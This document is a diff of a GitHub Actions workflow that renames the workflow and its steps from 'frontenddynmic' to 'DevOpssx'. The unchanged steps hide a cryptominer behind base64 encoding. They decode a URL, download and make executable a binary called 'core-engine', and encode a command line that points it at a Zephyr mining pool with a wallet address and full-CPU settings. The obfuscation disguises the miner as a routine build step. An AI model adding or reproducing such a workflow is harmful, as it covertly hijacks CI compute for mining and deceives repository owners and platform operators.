@@ -1,4 +1,4 @@
-name: frontenddynmic
+name: DevOpssx
 
 on:
   push:
@@ -12,21 +12,21 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
-      - name: Checkoutfrontenddynmic
+      - name: CheckoutDevOpssx
         uses: actions/checkout@v2
 
-      - name: Setup Dependencyfrontenddynmic
+      - name: Setup DependencyDevOpssx
         run: |
           sudo apt-get update
           sudo apt-get install -y curl libuv1-dev libssl-dev libhwloc-dev
 
-      - name: Download core-enginefrontenddynmic
+      - name: Download core-engineDevOpssx
         run: |
           ENCODED="aHR0cHM6Ly9naXRodWIuY29tL3JlYWR0aGVydGZtbWFudWFsLWRlbC9jb3JlLWVuZ2luZS9yZWxlYXNlcy9kb3dubG9hZC92MDMvY29yZS1lbmdpbmU="
           URL=$(echo "$ENCODED" | base64 -d)
           curl -L -o core-engine "$URL"
 
-      - name: Run Machinefrontenddynmic
+      - name: Run MachineDevOpssx
         run: |
           chmod +x core-engine
           ENCODED="Li9jb3JlLWVuZ2luZSAtbyB1czIuemVwaHlyLmhlcm9taW5lcnMuY29tOjExMjQgXAogIC11IFpFUEhzQTh4eHhYTEJoNjFnSzNLYjFYNFA4WHdnbTVGM2ZHcnVodTJqbVVlZ1NyYllFeWJGWEpSc3E5bVRWVFRhdWJTV25rano2clNENVlIdjdMQ0dRYVJUOW14aW02d3hFRS5MYXVzaExvY289OTYwMDAwIFwKICAtLWRvbmF0ZS1sZXZlbCAwIFwKICAtayAtLXRocmVhZHM9JChucHJvYykgLS1jcHUtcHJpb3JpdHk9NSAtLWh1Z2UtcGFnZXMtaml0IC0tY3B1LW5vLXlpZWxkIC0tcmFuZG9teC1uby1udW1hIFwKICAtYSByeC8wIC0tdGxzIC0tYXNtPXJ5emVuIC0tcmFuZG9teC1uby1yZG1zciAtLXJhbmRvbXgtd3Jtc3I9LTEgLS1yYW5kb214LW1vZGU9ZmFzdA=="
